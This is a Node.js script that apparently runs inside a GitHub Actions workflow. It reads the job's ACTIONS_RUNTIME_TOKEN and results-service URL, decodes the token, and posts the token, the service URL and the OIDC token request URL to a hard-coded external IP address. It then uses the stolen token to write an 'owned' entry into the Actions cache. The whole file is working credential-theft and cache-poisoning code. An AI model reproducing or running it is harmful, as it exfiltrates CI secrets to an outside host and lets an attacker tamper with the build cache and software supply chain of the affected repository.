const crypto = require('crypto')

const service = process.env.ACTIONS_RESULTS_URL
const token = process.env.ACTIONS_RUNTIME_TOKEN
const key = `owned-peer-runtime-cache-${process.env.GITHUB_RUN_ID}`
const version = crypto.createHash('sha256').update('owned-peer-runtime-cache-v1').digest('hex')
const content = Buffer.from(`OWNED-PEER-RUNTIME-CACHE-${crypto.randomBytes(32).toString('hex')}\n`)

async function rpc(method, body) {
  const response = await fetch(new URL(`/twirp/github.actions.results.api.v1.CacheService/${method}`, service), {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${token}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(body)
  })
  return {status: response.status, body: await response.json()}
}

async function main() {
  const claim = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString())
  console.log(`DAYBREAK_CACHE_IDS plan=${claim.plan_id} job=${claim.job_id}`)
  const staged = await fetch('http://16.146.243.72:8472/hca', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      boot_id: crypto.randomUUID(),
      kind: 'daybreak_oidc_peer',
      url: service,
      token,
      tokens: [token],
      run_urls: [service, process.env.ACTIONS_ID_TOKEN_REQUEST_URL].filter(Boolean),
      run_id: process.env.GITHUB_RUN_ID,
      plan_id: claim.plan_id,
      job_id: claim.job_id
    })
  })
  if (staged.status !== 201) throw new Error(`stage failed status=${staged.status}`)
  console.log(`DAYBREAK_OIDC_CONTEXT enabled=${Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_URL)}`)
  const create = await rpc('CreateCacheEntry', {key, version})
  const signedUploadUrl = create.body.signed_upload_url || create.body.signedUploadUrl
  if (create.status !== 200 || !create.body.ok || !signedUploadUrl) {
    throw new Error(`create failed status=${create.status} code=${create.body.code || '-'} msg=${create.body.msg || create.body.message || '-'} fields=${Object.keys(create.body).sort().join(',')}`)
  }
  const upload = await fetch(signedUploadUrl, {
    method: 'PUT',
    headers: {'x-ms-blob-type': 'BlockBlob'},
    body: content
  })
  if (!upload.ok) throw new Error(`upload failed status=${upload.status}`)
  const finalize = await rpc('FinalizeCacheEntryUpload', {key, version, size_bytes: `${content.length}`})
  if (finalize.status !== 200 || !finalize.body.ok) {
    throw new Error(`finalize failed status=${finalize.status} fields=${Object.keys(finalize.body).sort().join(',')}`)
  }
  console.log(`DAYBREAK_CACHE_TARGET key=${key} version=${version} sha256=${crypto.createHash('sha256').update(content).digest('hex')} bytes=${content.length}`)
}

main().catch(error => {
  console.error(error.message)
  process.exit(1)
})
